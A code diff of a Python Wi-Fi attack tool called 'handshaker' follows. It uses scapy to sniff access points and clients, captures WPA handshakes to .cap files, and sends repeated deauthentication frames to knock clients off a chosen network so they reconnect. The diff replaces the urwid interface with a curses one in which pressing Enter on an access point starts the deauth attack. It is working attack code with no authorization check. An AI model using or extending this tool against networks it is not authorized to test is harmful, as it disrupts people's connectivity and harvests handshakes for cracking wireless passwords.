@@ -1,53 +1,27 @@
 #!/usr/bin/env python3
 
-"""
-handshaker — WPA Handshake Sniffer and Deauth Tool
-
-- Displays APs and clients in a live ncurses UI.
-- Captures WPA handshakes and saves to .cap files if output directory is set.
-- Can filter by SSID/BSSID and do deauth for handshake capture.
-- Shows persistent EAPOL capture notifications in the top bar if filtered.
-"""
-
 import argparse
 import os
 import threading
 import time
 import subprocess
+import curses
 from datetime import datetime
-
 from scapy.all import *
-import urwid
 
-# =========== Globals & State ===========
-networks = {}          # BSSID -> {ssid, channel, clients: {mac: last_seen}}
-logs = []              # Scrollable log
+# ====== Globals & State ======
+networks = {}
+logs = []
 log_lock = threading.Lock()
-cap_files = {}         # output_file -> PcapWriter
+cap_files = {}
 stop_threads = False
-recent_eapol = {}      # (bssid, client) -> [timestamp, ...]
-
-# For persistent header notifications
-persistent_eapol_captures = set()  # set of (ssid, bssid) that got EAPOL
-
-def parse_args():
-    parser = argparse.ArgumentParser(
-        description='Capture WPA handshakes and manage Wi-Fi clients (with optional deauth).'
-    )
-    parser.add_argument('-i', '--interface', required=True, help='Wireless interface in monitor mode')
-    parser.add_argument('-c', '--channel', type=int, help='Channel to scan')
-    parser.add_argument('-s', '--target-ssid', help='Filter by SSID')
-    parser.add_argument('-b', '--target-bssid', help='Filter by BSSID')
-    parser.add_argument('-t', '--timeout', type=int, default=60, help='Client timeout (seconds)')
-    parser.add_argument('-d', '--deauth', action='store_true', help='Enable deauthentication')
-    parser.add_argument('--interval', type=int, default=10, help='Deauth burst interval (seconds)')
-    parser.add_argument('--output-directory', help='Directory for .cap files (no output if not set)')
-    return parser.parse_args()
-
-# ========== Utility Functions ==========
+persistent_eapol_captures = set()   # BSSIDs in lower-case
+current_deauth_thread = [None]
+filtered_bssid = [None]
+current_channel_hopper_thread = [None]
+channel_hopper_stop = [False]
 
 def is_unicast(mac):
-    """Check if a MAC address is unicast."""
     try:
         if not mac or len(mac.split(':')) != 6:
             return False
@@ -57,7 +31,6 @@ def is_unicast(mac):
         return False
 
 def log(msg):
-    """Append a timestamped log message."""
     with log_lock:
         ts = datetime.now().strftime('%H:%M:%S')
         logs.append(f'[{ts}] {msg}')
@@ -65,10 +38,9 @@ def log(msg):
             logs.pop(0)
 
 def channel_hopper(interface, user_channel=None):
-    """Hop channels, or set fixed channel if user specified."""
     chs = [1,2,3,4,5,6,7,8,9,10,11]
     i = 0
-    while not stop_threads:
+    while not channel_hopper_stop[0]:
         if user_channel:
             ch = user_channel
         else:
@@ -85,7 +57,6 @@ def channel_hopper(interface, user_channel=None):
             break
 
 def get_capfile(ssid, output_dir):
-    """Get or create a PcapWriter for a given SSID in the output directory."""
     if not output_dir:
         return None
     safe_ssid = ssid if ssid else 'unknown'
@@ -95,24 +66,32 @@ def get_capfile(ssid, output_dir):
     return cap_files[fn]
 
 def cleanup_capfiles():
-    """Close all open PcapWriters."""
     for pcap in cap_files.values():
         try:
             pcap.close()
         except:
             pass
 
-# ========== Packet Processing ==========
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description='Capture WPA handshakes and manage Wi-Fi clients (with optional deauth).'
+    )
+    parser.add_argument('-i', '--interface', required=True, help='Wireless interface in monitor mode')
+    parser.add_argument('-c', '--channel', type=int, help='Channel to scan')
+    parser.add_argument('-s', '--target-ssid', help='Filter by SSID')
+    parser.add_argument('-b', '--target-bssid', help='Filter by BSSID')
+    parser.add_argument('-t', '--timeout', type=int, default=60, help='Client timeout (seconds)')
+    parser.add_argument('-d', '--deauth', action='store_true', help='Enable deauthentication')
+    parser.add_argument('--interval', type=int, default=10, help='Deauth burst interval (seconds)')
+    parser.add_argument('--output-directory', help='Directory for .cap files (no output if not set)')
+    return parser.parse_args()
 
 def process_packet(pkt, args, ui=None):
-    """Process a sniffed 802.11 packet."""
-    # ---- AP Detection ----
     if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
         bssid = pkt[Dot11].addr2
         ssid = '<hidden>'
         if pkt.haslayer(Dot11Elt):
             ssid = pkt[Dot11Elt].info.decode(errors='ignore')
-        # Extract channel
         channel = None
         elt = pkt.getlayer(Dot11Elt)
         while elt is not None:
@@ -120,7 +99,6 @@ def process_packet(pkt, args, ui=None):
                 channel = elt.info[0]
                 break
             elt = elt.payload.getlayer(Dot11Elt)
-        # Filtering
         if args.target_ssid and ssid != args.target_ssid:
             return
         if args.target_bssid and bssid.lower() != args.target_bssid.lower():
@@ -132,7 +110,6 @@ def process_packet(pkt, args, ui=None):
             networks[bssid]['ssid'] = ssid
             networks[bssid]['channel'] = channel
 
-    # ---- Client Detection (Data/Auth) ----
     if pkt.haslayer(Dot11):
         toDS = pkt[Dot11].FCfield & 0x1
         fromDS = pkt[Dot11].FCfield & 0x2
@@ -146,7 +123,6 @@ def process_packet(pkt, args, ui=None):
             return
         if not bssid or not client or not is_unicast(client):
             return
-        # Only track clients if AP is already known when filtering
         if (args.target_ssid or args.target_bssid) and bssid not in networks:
             return
         if args.target_bssid and bssid.lower() != args.target_bssid.lower():
@@ -157,42 +133,25 @@ def process_packet(pkt, args, ui=None):
             log(f'Client {client} seen on {bssid}')
         networks[bssid]['clients'][client] = time.time()
 
-    # ---- WPA Handshake Detection ----
+    # --- THIS is the new EAPOL marking logic: ---
     if pkt.haslayer(EAPOL):
-        bssid = client = None
+        bssid = None
         if pkt[Dot11].addr2 in networks:
             bssid = pkt[Dot11].addr2
-            client = pkt[Dot11].addr1
         elif pkt[Dot11].addr1 in networks:
             bssid = pkt[Dot11].addr1
-            client = pkt[Dot11].addr2
         ssid = networks.get(bssid, {}).get('ssid', 'unknown')
         log(f'Handshake/EAPOL captured for SSID {ssid} ({bssid})')
-
-        # Mark EAPOL as "crackable" if at least 2 seen in 10 seconds
-        if bssid and client and (args.target_ssid or args.target_bssid):
-            now = time.time()
-            key = (bssid, client)
-            if key not in recent_eapol:
-                recent_eapol[key] = []
-            recent_eapol[key] = [t for t in recent_eapol[key] if now - t < 10]
-            recent_eapol[key].append(now)
-            if len(recent_eapol[key]) >= 2:
-                # Only add new notification if not already present for this ssid/bssid
-                capture_key = (ssid, bssid)
-                if capture_key not in persistent_eapol_captures:
-                    persistent_eapol_captures.add(capture_key)
-                    if ui:
-                        ui.update_eapol_notification()
-                recent_eapol[key] = []
-
-        # Write to capture file if set
+        # Mark as having handshake on *any* EAPOL for this BSSID:
+        if bssid:
+            bssid_lc = bssid.lower()
+            if bssid_lc not in persistent_eapol_captures:
+                persistent_eapol_captures.add(bssid_lc)
+                log(f'Marked {ssid} ({bssid}) as having EAPOL')
         if args.output_directory:
             capfile = get_capfile(ssid, args.output_directory)
             if capfile:
                 capfile.write(pkt)
-
-    # ---- Save all packets for filtered networks ----
     if pkt.haslayer(Dot11):
         bssid = pkt[Dot11].addr2 if pkt[Dot11].addr2 in networks else pkt[Dot11].addr1
         ssid = networks.get(bssid, {}).get('ssid', None)
@@ -201,12 +160,11 @@ def process_packet(pkt, args, ui=None):
             if capfile:
                 capfile.write(pkt)
 
-# ========== Worker Threads ==========
-
 def deauth_worker(args):
-    """Periodically send deauth packets to all tracked clients."""
     while not stop_threads:
         for bssid, ap in networks.items():
+            if args.target_bssid and bssid.lower() != args.target_bssid.lower():
+                continue
             for client in list(ap['clients']):
                 if not is_unicast(client):
                     continue
@@ -216,7 +174,6 @@ def deauth_worker(args):
         time.sleep(args.interval)
 
 def timeout_worker(timeout):
-    """Remove clients that haven't been seen in timeout seconds."""
     while not stop_threads:
         now = time.time()
         for bssid, ap in networks.items():
@@ -226,88 +183,208 @@ def timeout_worker(timeout):
                 del ap['clients'][c]
         time.sleep(5)
 
-def sniffer_worker(args, ui):
-    """Sniff packets, send to process_packet()."""
+def sniffer_worker(args, ui=None):
     sniff(iface=args.interface,
           prn=lambda p: process_packet(p, args, ui),
           store=0, stop_filter=lambda x: stop_threads)
 
-# ========== UI Class ==========
-
-class HandshakerUI:
-    """Ncurses-like UI for handshaker."""
+class NcursesUI:
     def __init__(self, args):
         self.args = args
-        self.ap_list_walker = urwid.SimpleListWalker([])
-        self.log_walker = urwid.SimpleListWalker([])
-        self.ap_listbox = urwid.ListBox(self.ap_list_walker)
-        self.log_listbox = urwid.ListBox(self.log_walker)
-        self.header_widget = urwid.Text(self.make_header())
-        self.layout = urwid.Frame(
-            header=self.header_widget,
-            body=urwid.Pile([
-                ('weight', 3, self.ap_listbox),
-                ('weight', 1, self.log_listbox)
-            ])
-        )
-        self.loop = urwid.MainLoop(self.layout, unhandled_input=self.unhandled_input)
+        self.selected_ap_idx = 0
+        self.ap_bssids = []
+        self.log_scroll = 0
+        self.running = True
+        self.status_msg = ""
+        self.prompt_active = False
+        self.prompt_str = ""
+        self.prompt_callback = None
 
-    def make_header(self):
-        """Build top bar, tacking EAPOL captures at end if any."""
-        base = "Handshaker: WPA Handshake Sniffer/Deauth Tool — q to quit"
-        if persistent_eapol_captures:
-            parts = [f"[ WPA EAPOL Captured {ssid} {bssid} ]"
-                     for ssid, bssid in sorted(persistent_eapol_captures)]
-            return f"{base}   " + " ".join(parts)
-        return base
+    def draw(self, stdscr):
+        stdscr.clear()
+        maxy, maxx = stdscr.getmaxyx()
 
-    def update_eapol_notification(self):
-        """Force header redraw."""
-        self.header_widget.set_text(self.make_header())
+        if maxy < 6 or maxx < 40:
+            try:
+                stdscr.addstr(0, 0, "Terminal too small. Resize and restart.", curses.A_REVERSE)
+            except curses.error:
+                pass
+            stdscr.refresh()
+            return
 
-    def unhandled_input(self, k):
-        """Exit on q/Q."""
-        if k in ('q', 'Q'):
-            global stop_threads
-            stop_threads = True
-            raise urwid.ExitMainLoop()
+        title = "handshaker — ↑↓=select AP  Enter=deauth  PgUp/PgDn=scroll log  q=quit"
+        try:
+            stdscr.addnstr(0, 0, title[:maxx].ljust(maxx), maxx, curses.A_REVERSE)
+        except curses.error:
+            pass
 
-    def update(self, *_):
-        """Periodic update of UI elements."""
-        # Update AP/client list
-        items = []
-        for bssid, ap in networks.items():
+        panel_h = maxy//2 - 1
+        row = 1
+        aps = []
+        self.ap_bssids = []
+        if filtered_bssid[0] and filtered_bssid[0] in networks:
+            bssid = filtered_bssid[0]
+            ap = networks[bssid]
             ssid = ap.get('ssid', '<unknown>')
             ch = ap.get('channel', '?')
-            header = urwid.Text([('bold', f'{ssid:20}  {bssid:17}  ch{ch}')])
-            clients = ap.get('clients', {})
-            client_texts = [urwid.Text(f'    ↳ {c}') for c in clients]
-            items.append(header)
-            items.extend(client_texts)
-        self.ap_list_walker[:] = items
-
-        # Update logs, auto-scroll if at end
+            aps.append((ssid, bssid, ch))
+            self.ap_bssids.append(bssid)
+        else:
+            for bssid, ap in networks.items():
+                ssid = ap.get('ssid', '<unknown>')
+                ch = ap.get('channel', '?')
+                aps.append((ssid, bssid, ch))
+                self.ap_bssids.append(bssid)
+        for i, (ssid, bssid, ch) in enumerate(aps):
+            marker = " [EAPOL]" if bssid and bssid.lower() in persistent_eapol_captures else ""
+            line = f"{'>' if i==self.selected_ap_idx else ' '} {ssid:20} {bssid:17} ch{ch}{marker}"
+            attr = curses.A_BOLD | (curses.A_REVERSE if i==self.selected_ap_idx else 0)
+            if row < panel_h:
+                try:
+                    stdscr.addnstr(row, 0, line[:maxx].ljust(maxx), maxx, attr)
+                except curses.error:
+                    pass
+                row += 1
+            if i==self.selected_ap_idx:
+                cl = networks[bssid]['clients']
+                for cli_mac in cl:
+                    if row < panel_h:
+                        try:
+                            stdscr.addnstr(row, 2, f"↳ {cli_mac}"[:maxx-2].ljust(maxx-2), maxx-2)
+                        except curses.error:
+                            pass
+                        row += 1
+        log_start = panel_h
+        if log_start < maxy:
+            try:
+                stdscr.hline(log_start, 0, "-", maxx)
+            except curses.error:
+                pass
+        if log_start+1 < maxy:
+            try:
+                stdscr.addnstr(log_start+1, 0, "Event Log".ljust(maxx), maxx, curses.A_BOLD)
+            except curses.error:
+                pass
         with log_lock:
-            new_logs = [urwid.Text(l) for l in logs[-50:]]
-        log_box = self.log_listbox
-        log_focus_at_end = False
-        if len(self.log_walker):
-            if log_box.focus_position == len(self.log_walker) - 1:
-                log_focus_at_end = True
-        self.log_walker[:] = new_logs
-        if len(self.log_walker) > 0 and log_focus_at_end:
-            log_box.focus_position = len(self.log_walker) - 1
+            view_logs = logs[-(panel_h-3+self.log_scroll):-self.log_scroll if self.log_scroll else None]
+        for i, l in enumerate(view_logs or []):
+            if log_start+2+i < maxy-1:
+                try:
+                    stdscr.addnstr(log_start+2+i, 0, l[:maxx].ljust(maxx), maxx)
+                except curses.error:
+                    pass
+        if maxy > 1:
+            if self.prompt_active:
+                try:
+                    stdscr.addnstr(maxy-1, 0, self.prompt_str[:maxx].ljust(maxx), maxx, curses.A_REVERSE)
+                except curses.error:
+                    pass
+            elif self.status_msg:
+                try:
+                    stdscr.addnstr(maxy-1, 0, self.status_msg[:maxx].ljust(maxx), maxx, curses.A_REVERSE)
+                except curses.error:
+                    pass
+        stdscr.refresh()
 
-        # Update header if needed
-        self.header_widget.set_text(self.make_header())
-        self.loop.set_alarm_in(1, self.update)
+    def prompt(self, stdscr, msg, callback):
+        self.prompt_active = True
+        self.prompt_str = msg
+        self.prompt_input = ""
+        self.prompt_callback = callback
 
-    def run(self):
-        """Run the urwid main loop."""
-        self.loop.set_alarm_in(0, self.update)
-        self.loop.run()
+        while self.prompt_active:
+            self.draw(stdscr)
+            maxy, maxx = stdscr.getmaxyx()
+            stdscr.timeout(100)
+            ch = stdscr.getch()
+            if ch == -1:
+                continue
+            if ch in (10, 13):
+                self.prompt_active = False
+                cb = self.prompt_callback
+                self.prompt_callback = None
+                if cb:
+                    cb(self.prompt_input)
+            elif ch in (27,):
+                self.prompt_active = False
+                self.prompt_str = ""
+                self.prompt_input = ""
+            elif ch in (curses.KEY_BACKSPACE, 127, 8):
+                self.prompt_input = self.prompt_input[:-1]
+            elif 32 <= ch < 128 and len(self.prompt_str) < maxx - 1:
+                if len(msg + self.prompt_input) < maxx - 1:
+                    self.prompt_input += chr(ch)
+            self.prompt_str = msg + self.prompt_input
 
-# ========== Main Entry Point ==========
+    def set_filters_and_deauth(self, ssid, bssid, channel, outdir):
+        self.args.target_ssid = ssid
+        self.args.target_bssid = bssid
+        self.args.channel = channel
+        self.args.output_directory = outdir
+        self.args.deauth = True
+        filtered_bssid[0] = bssid
+        self.selected_ap_idx = 0
+        log(f'Filters updated: SSID={ssid}, BSSID={bssid}, channel={channel}, output_dir={outdir}. Deauth started.')
+
+        channel_hopper_stop[0] = True
+        if current_channel_hopper_thread[0]:
+            current_channel_hopper_thread[0].join(timeout=1)
+            current_channel_hopper_thread[0] = None
+
+        try:
+            subprocess.run(['iwconfig', self.args.interface, 'channel', str(channel)],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            log(f"Switched interface {self.args.interface} to channel {channel} for selected AP.")
+        except Exception as e:
+            log(f"Failed to set channel: {e}")
+
+        global stop_threads
+        stop_threads = True
+        if current_deauth_thread[0] and current_deauth_thread[0].is_alive():
+            current_deauth_thread[0].join()
+        stop_threads = False
+
+        t_deauth = threading.Thread(target=deauth_worker, args=(self.args,), daemon=True)
+        t_deauth.start()
+        current_deauth_thread[0] = t_deauth
+
+    def run(self, stdscr):
+        curses.curs_set(0)
+        stdscr.timeout(250)
+        while self.running:
+            self.draw(stdscr)
+            ch = stdscr.getch()
+            if ch == -1:
+                continue
+            if self.prompt_active:
+                continue
+            if ch in (ord('q'), ord('Q')):
+                self.running = False
+                break
+            elif ch in (curses.KEY_UP, ord('k')):
+                if self.selected_ap_idx > 0:
+                    self.selected_ap_idx -= 1
+            elif ch in (curses.KEY_DOWN, ord('j')):
+                if self.selected_ap_idx < len(self.ap_bssids)-1:
+                    self.selected_ap_idx += 1
+            elif ch in (10, 13):
+                if 0 <= self.selected_ap_idx < len(self.ap_bssids):
+                    bssid = self.ap_bssids[self.selected_ap_idx]
+                    ap = networks.get(bssid)
+                    if ap:
+                        ssid = ap.get('ssid', '<unknown>')
+                        channel = ap.get('channel', 1)
+                        def cb(outdir):
+                            if outdir:
+                                os.makedirs(outdir, exist_ok=True)
+                                self.set_filters_and_deauth(ssid, bssid, channel, outdir)
+                        self.prompt(stdscr, "Output directory: ", cb)
+            elif ch == curses.KEY_PPAGE:
+                self.log_scroll += 5
+            elif ch == curses.KEY_NPAGE:
+                self.log_scroll = max(0, self.log_scroll-5)
+            else:
+                self.log_scroll = 0
 
 def main():
     args = parse_args()
@@ -319,12 +396,12 @@ def main():
     else:
         log('Channel hopping enabled')
 
-    ui = HandshakerUI(args)
-
-    # Launch worker threads
+    ui = NcursesUI(args)
     threads = []
+    channel_hopper_stop[0] = False
     t_ch = threading.Thread(target=channel_hopper, args=(args.interface, args.channel), daemon=True)
     t_ch.start(); threads.append(t_ch)
+    current_channel_hopper_thread[0] = t_ch
     t_to = threading.Thread(target=timeout_worker, args=(args.timeout,), daemon=True)
     t_to.start(); threads.append(t_to)
     t_sniff = threading.Thread(target=sniffer_worker, args=(args, ui), daemon=True)
@@ -334,7 +411,7 @@ def main():
         t_deauth.start(); threads.append(t_deauth)
 
     try:
-        ui.run()
+        curses.wrapper(ui.run)
     except KeyboardInterrupt:
         pass
     finally:
